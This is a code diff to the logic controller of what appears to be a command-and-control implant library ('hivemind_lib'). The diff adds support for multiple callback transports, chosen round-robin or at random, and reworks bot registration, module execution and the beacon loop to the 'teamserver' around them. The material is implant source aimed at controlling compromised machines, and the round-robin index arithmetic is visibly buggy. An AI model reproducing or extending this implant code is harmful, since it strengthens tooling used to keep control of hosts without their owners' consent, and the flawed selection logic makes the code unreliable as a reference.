@@ -1,22 +1,46 @@
 #include "logic_controller.hpp"
 
-#include <utility>
-
 namespace hivemind_lib {
 bool LogicController::running_ = true;
 boost::mutex LogicController::thread_infos_lock_;
+int current_transport = 0;
+
+std::shared_ptr<Transport> LogicController::GetTransportToUse() {
+  //TODO look at possibly disabling a transport if a callback fails, not here specifically but in general.
+  if(this->transports_.size() == 1){
+    return this->transports_[0];
+  }
+  switch(this->transport_selection_method_){
+    case ROUND_ROBIN: {
+      auto transport_to_return = this->transports_[current_transport];
+      current_transport = (current_transport + 1) % this->transports_.size()-1;
+      return transport_to_return;
+    }
+    case RANDOM: {
+      std::random_device rd;
+      std::mt19937 mt(rd());
+      std::uniform_int_distribution<int> distribution(0,this->transports_.size()-1);
+      int random_index = distribution(mt);
+      return this->transports_[random_index];
+    }
+    case NONE: {
+      this->SetError();
+      DEBUG("No method given for selecting a transport", LEVEL_ERROR);
+      return nullptr;
+    }
+  }
+}
 
 LogicController::LogicController() {
-  this->transport_method_ = "NONE";
   signal(SIGINT, LogicController::SignalHandler);
   signal(SIGABRT, LogicController::SignalHandler);
   signal(SIGTERM, LogicController::SignalHandler);
 }
 
-int LogicController::RegisterBot() {
-  if (!this->transport_) {
+void LogicController::RegisterBot() {
+  if (this->transports_.empty()) {
     this->SetError();
-    return -1;
+    return;
   }
   struct RegistrationRequest registration_request;
   struct Packet packet;
@@ -51,7 +75,12 @@ int LogicController::RegisterBot() {
   nlohmann::json p = nlohmann::json(packet);
   DEBUG(p.dump(), LEVEL_DEBUG);
 
-  auto response = this->transport_->SendAndReceive(p.dump());
+  auto transport = this->GetTransportToUse();
+  if(!transport){
+    return;
+  }
+
+  auto response = transport->SendAndReceive(p.dump());
   DEBUG(response, LEVEL_DEBUG);
   try {
     nlohmann::json resp = nlohmann::json::parse(response);
@@ -69,21 +98,21 @@ int LogicController::RegisterBot() {
       if (reg_error.errorNum == DUPLICATE_REGISTRATION) {
         DEBUG("Was previously registered, received UUID", LEVEL_DEBUG);
         this->implant_info_.UUID = packet_resp[0].implantInfo.UUID;
-        return 0;
+        return;
       }
       this->SetError();
-      return reg_error.errorNum;
+      return;
     } else {
       DEBUG("Unexpected packet type: " << packet_resp[0].packetType, LEVEL_ERROR);
       this->SetError();
-      return ERROR_CODE;
+      return;
     }
   } catch (...) {
     DEBUG("Error in parsing registration packet", LEVEL_ERROR);
     this->SetError();
-    return ERROR_CODE;
+    return;
   }
-  return 0;
+  return;
 }
 
 void LogicController::ThreadHandlerFunc() {
@@ -141,8 +170,13 @@ void LogicController::FuncExecutor(const std::string &mod,
   packet.data = r.dump();
 
   nlohmann::json p = nlohmann::json(packet);
+  auto transport = this->GetTransportToUse();
 
-  this->transport_->Send(p.dump());
+  if(!transport){
+    return;
+  }
+
+  transport->Send(p.dump());
 }
 
 void LogicController::CreateFuncExecutor(const std::string &mod,
@@ -176,7 +210,11 @@ void LogicController::BeginComms() {
   nlohmann::json p = nlohmann::json(packet);
   DEBUG(p.dump(), LEVEL_DEBUG);
   while (LogicController::running_) {
-    auto response = this->transport_->SendAndReceive(p.dump());
+    auto transport = this->GetTransportToUse();
+    if(!transport){
+      return;
+    }
+    auto response = transport->SendAndReceive(p.dump());
     DEBUG(response, LEVEL_DEBUG);
     if (response.length() == 0) {
       DEBUG("No connection to teamserver", LEVEL_ERROR);
@@ -214,15 +252,15 @@ void LogicController::BeginComms() {
   thread_handler.join();
 }
 
-void LogicController::AddModule(const std::string& module) {
-  if(module == "ALL"){
-    for(const auto& c: ModuleFactory::GetClasses()){
+void LogicController::AddModule(const std::string &module) {
+  if (module == "ALL") {
+    for (const auto &c: ModuleFactory::GetClasses()) {
       std::shared_ptr<Module> temp = ModuleFactory::MakeUnique(c);
       this->modules_.insert({temp->mod_info_.module_name, std::move(temp)});
     }
-  }else{
+  } else {
     std::shared_ptr<Module> temp = ModuleFactory::MakeUnique(module);
-    if(!temp){
+    if (!temp) {
       DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
       this->SetError();
       ModuleFactory::ShowClasses();
@@ -233,27 +271,28 @@ void LogicController::AddModule(const std::string& module) {
   }
 }
 
-void LogicController::SetTransportMethod(const std::string& transport) {
+void LogicController::AddTransportMethod(const std::string &transport,
+                                         const std::string &hostname,
+                                         const std::string &port) {
   auto all_transports = TransportFactory::GetClasses();
-  if(std::find(all_transports.begin(), all_transports.end(), transport) == all_transports.end()){
+  if (std::find(all_transports.begin(), all_transports.end(), transport) == all_transports.end()) {
     DEBUG("UNKNOWN TRANSPORT", LEVEL_ERROR);
     this->SetError();
     TransportFactory::ShowClasses();
     return;
   }
-  this->transport_method_ = transport;
-}
-
-void LogicController::InitComms(const std::string &hostname, const std::string &port) {
-  std::shared_ptr<Transport> temp = TransportFactory::MakeUnique(this->transport_method_, hostname, port);
-  if(!temp){
+  std::shared_ptr<Transport> temp = TransportFactory::MakeUnique(transport, hostname, port);
+  if (!temp) {
     DEBUG("ERROR MAKING TRANSPORT", LEVEL_ERROR);
-    this->SetError();
     return;
   }
-  DEBUG("Adding " << this->transport_method_ << " Transport", LEVEL_DEBUG);
-  this->transport_ = std::move(temp);
+  DEBUG("Adding " << transport << " Transport", LEVEL_DEBUG);
+  this->transports_.push_back(std::move(temp));
 }
+
+//void LogicController::InitComms(const std::string &hostname, const std::string &port) {
+//
+//}
 
 bool LogicController::HasError() const {
   return this->error_;
@@ -266,5 +305,9 @@ void LogicController::SetError() {
 void LogicController::SignalHandler(int) {
   LogicController::running_ = false;
   DEBUG("Shutting down", LEVEL_INFO);
+}
+
+void LogicController::SetTransportSelectionMethod(TransportSelectionMethod transport_selection_method) {
+  transport_selection_method_ = transport_selection_method;
 }
 }
